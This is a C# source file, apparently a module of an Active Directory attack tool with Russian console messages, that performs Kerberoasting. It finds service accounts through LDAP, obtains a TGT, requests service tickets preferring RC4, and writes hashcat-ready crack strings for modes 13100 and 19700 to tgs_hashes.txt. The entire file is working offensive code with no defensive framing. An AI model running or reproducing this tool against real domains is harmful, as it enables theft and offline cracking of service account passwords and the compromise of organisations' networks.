using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.IO;
using System.Linq;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;

namespace krbengine
{
    public class KerberoastEngine
    {
        public static async Task RunAsync(Dictionary<string, string> opt)
        {
            string dcIp = opt["-dc-ip"];
            string domain = opt["-d"];
            string creds = opt["-u"]; 

            string krbUser = creds;
            string krbPass = "";
            if (creds != null && creds.Contains(":")) {
                var p = creds.Split(new[] { ':' }, 2);
                krbUser = p[0]; krbPass = p[1];
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[*] ЗАПУСК МОДУЛЯ: KERBEROAST");
            Console.WriteLine($"    DC: {dcIp} | Domain: {domain} | Identity: {krbUser}");
            Console.ResetColor();

            var targets = new List<Tuple<string, string>>();
            Console.WriteLine("\n[*] Режим: LDAP Разведка (поиск сервисных учетных записей)...");
            
            try {
                var res = LdapClient.Search(dcIp, domain, creds, "(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt))(!(sAMAccountName=*$)))", new[] { "sAMAccountName", "servicePrincipalName" });
                foreach (var entry in res) {
                    string owner = entry.ContainsKey("sAMAccountName") ? entry["sAMAccountName"][0] : "unknown";
                    if (entry.ContainsKey("servicePrincipalName"))
                        foreach (var spn in entry["servicePrincipalName"]) {
                            Console.WriteLine($"[+] Найден SPN: {spn} (Владелец: {owner})");
                            targets.Add(new Tuple<string, string>(spn, owner));
                        }
                }
            } catch (Exception ex) { 
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] Ошибка LDAP: {ex.Message}"); 
                Console.ResetColor();
                return; 
            }

            if (targets.Count == 0) {
                Console.WriteLine("[-] Уязвимые SPN не обнаружены.");
                return;
            }

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write($"\n[?] Найдено {targets.Count} целей. Начать извлечение TGS билетов? (Y/n): ");
            Console.ResetColor();
            if (Console.ReadLine()?.ToLower() == "n") return;

            if (string.IsNullOrEmpty(krbPass)) {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[!] ОШИБКА: Для извлечения билетов (Roasting) необходим пароль (-u user:password)");
                Console.ResetColor();
                return;
            }

            Console.WriteLine($"\n[*] Получение TGT (AS-REQ) для {krbUser}...");
            var authData = await GetTgtManualAsync(krbUser, krbPass, domain, dcIp);
            if (authData.asRep == null) return;

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[+] TGT успешно получен.");
            Console.ResetColor();

            Console.WriteLine($"\n[*] Извлечение сервисных билетов и формирование хэшей...");
            foreach (var target in targets)
                await RoastSpnManual(target.Item1, target.Item2, domain, dcIp, authData.asRep, authData.sessionKey);

            Console.WriteLine("\n[*] Модуль Kerberoasting завершил работу.");
        }

        // Получение TGT с обработкой Kerberos pre-authentication
        private static async Task<(KrbAsRep asRep, KerberosKey sessionKey)> GetTgtManualAsync(string user, string pass, string domain, string dcIp)
        {
            try {
                var creds = new KerberosPasswordCredential(user, pass, domain);
                var initialReq = KrbAsReq.CreateAsReq(creds, default);
                initialReq.Body.EType = new[] { EncryptionType.AES256_CTS_HMAC_SHA1_96, EncryptionType.RC4_HMAC_NT };

                byte[] initialBytes = await NetworkClient.SendKerberosPacketAsync(initialReq.EncodeApplication().ToArray(), dcIp);
                ReadOnlyMemory<byte> responseMem = new ReadOnlyMemory<byte>(initialBytes);

                KerberosKey clientKey = null;

                if (responseMem.Span[0] == 0x7E) {
                    var krbError = KrbError.DecodeApplication(responseMem);
                    if (krbError.ErrorCode == KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED) {
                        Console.WriteLine("[*] Требуется Pre-Auth. Вычисление соли и шифрование Timestamp...");
                        string kdcSalt = null;
                        EncryptionType etype = EncryptionType.AES256_CTS_HMAC_SHA1_96;

                        if (krbError.EData.HasValue) {
                            var methodData = krbError.DecodePreAuthentication();
                            var etypeInfo = methodData.FirstOrDefault(p => p.Type == PaDataType.PA_ETYPE_INFO2);
                            if (etypeInfo != null) {
                                var info = etypeInfo.DecodeETypeInfo2().FirstOrDefault();
                                if (info != null) { kdcSalt = info.Salt; etype = info.EType; }
                            }
                        }

                        var principal = new PrincipalName(PrincipalNameType.NT_PRINCIPAL, domain.ToUpper(), new[] { user });
                        clientKey = new KerberosKey(pass, principal, etype: etype, salt: kdcSalt);

                        var preAuthReq = KrbAsReq.CreateAsReq(creds, default);
                        preAuthReq.Body.EType = new[] { etype };
                        var paTs = new KrbPaEncTsEnc { PaTimestamp = DateTimeOffset.UtcNow, PaUSec = 0 };
                        var encTs = KrbEncryptedData.Encrypt(paTs.Encode().ToArray(), clientKey, KeyUsage.PaEncTs);
                        preAuthReq.PaData = new[] { new KrbPaData { Type = PaDataType.PA_ENC_TIMESTAMP, Value = encTs.Encode() } };

                        byte[] repBytes = await NetworkClient.SendKerberosPacketAsync(preAuthReq.EncodeApplication().ToArray(), dcIp);
                        responseMem = new ReadOnlyMemory<byte>(repBytes);
                        
                        if (responseMem.Span[0] == 0x7E) {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"    [-] Ошибка аутентификации: {KrbError.DecodeApplication(responseMem).ErrorCode}");
                            Console.ResetColor();
                            return (null, null);
                        }
                    }
                }

                var asRep = KrbAsRep.DecodeApplication(responseMem);
                if (clientKey == null) clientKey = creds.CreateKey();
                var encPart = asRep.EncPart.Decrypt(clientKey, KeyUsage.EncAsRepPart, data => KrbEncAsRepPart.DecodeApplication(data));
                return (asRep, new KerberosKey(encPart.Key));
            }
            catch (Exception ex) { Console.WriteLine($"    [-] TGT Error: {ex.Message}"); return (null, null); }
        }

        // Запрос TGS для найденного SPN и формирование hashcat-совместимой строки
        private static async Task RoastSpnManual(string spn, string targetUser, string domain, string dcIp, KrbAsRep asRep, KerberosKey tgtSessionKey)
        {
            try {
                Console.WriteLine($"[*] Запрос билета для: {spn}");

                var body = new KrbKdcReqBody {
                    KdcOptions = KdcOptions.Forwardable | KdcOptions.Renewable,
                    Realm = domain.ToUpper(),
                    SName = new KrbPrincipalName { Type = PrincipalNameType.NT_SRV_INST, Name = spn.Split('/') },
                    Till = DateTimeOffset.UtcNow.AddDays(1),
                    Nonce = 1234567,
                    EType = new[] { EncryptionType.RC4_HMAC_NT, EncryptionType.AES256_CTS_HMAC_SHA1_96 }
                };

                var crypto = CryptoService.CreateTransform(tgtSessionKey.EncryptionType);
                var bodyChecksum = crypto.MakeChecksum(body.Encode().ToArray(), tgtSessionKey, KeyUsage.PaTgsReqChecksum, KeyDerivationMode.Kc, 12);

                var authenticator = new KrbAuthenticator {
                    CName = asRep.CName, CRealm = asRep.CRealm, CTime = DateTimeOffset.UtcNow, CuSec = 0,
                    SequenceNumber = 1234567, Checksum = new KrbChecksum { Type = (ChecksumType)crypto.ChecksumType, Checksum = bodyChecksum.ToArray() }
                };

                var encAuthenticator = KrbEncryptedData.Encrypt(authenticator.EncodeApplication().ToArray(), tgtSessionKey, KeyUsage.PaTgsReqAuthenticator);
                var apReq = new KrbApReq { Ticket = asRep.Ticket, Authenticator = encAuthenticator };
                var tgsReq = new KrbTgsReq { PaData = new[] { new KrbPaData { Type = PaDataType.PA_TGS_REQ, Value = apReq.EncodeApplication().ToArray() } }, Body = body };

                byte[] repBytes = await NetworkClient.SendKerberosPacketAsync(tgsReq.EncodeApplication().ToArray(), dcIp);
                if (repBytes == null) return;
                if (repBytes[0] == 0x7E) {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"    [-] Ошибка TGS: {KrbError.DecodeApplication(new ReadOnlyMemory<byte>(repBytes)).ErrorCode}");
                    Console.ResetColor();
                    return;
                }

                var tgsRep = KrbTgsRep.DecodeApplication(new ReadOnlyMemory<byte>(repBytes));
                int etype = (int)tgsRep.Ticket.EncryptedPart.EType;
                string cipherHex = BitConverter.ToString(tgsRep.Ticket.EncryptedPart.Cipher.ToArray()).Replace("-", "").ToLower();
                
                string hash = etype == 18 
                    ? $"$krb5tgs$18${targetUser}${domain.ToUpper()}$*{targetUser}${domain.ToUpper()}${spn}*${cipherHex.Substring(cipherHex.Length - 24)}${cipherHex.Substring(0, cipherHex.Length - 24)}"
                    : $"$krb5tgs$23$*{targetUser.ToLower()}${domain.ToUpper()}${spn}*${cipherHex.Substring(0, 32)}${cipherHex.Substring(32)}";

                string hashcatMode = etype == 23 ? "13100" : "19700";

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] УСПЕХ! Билет получен (ETYPE {etype})");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"    Hashcat Mode : -m {hashcatMode}");
                Console.WriteLine($"\n{hash}\n");
                Console.ResetColor();
                await File.AppendAllTextAsync("tgs_hashes.txt", hash + Environment.NewLine);
            }
            catch (Exception ex) { Console.WriteLine($"[-] TGS Error: {ex.Message}"); }
        }
    }
}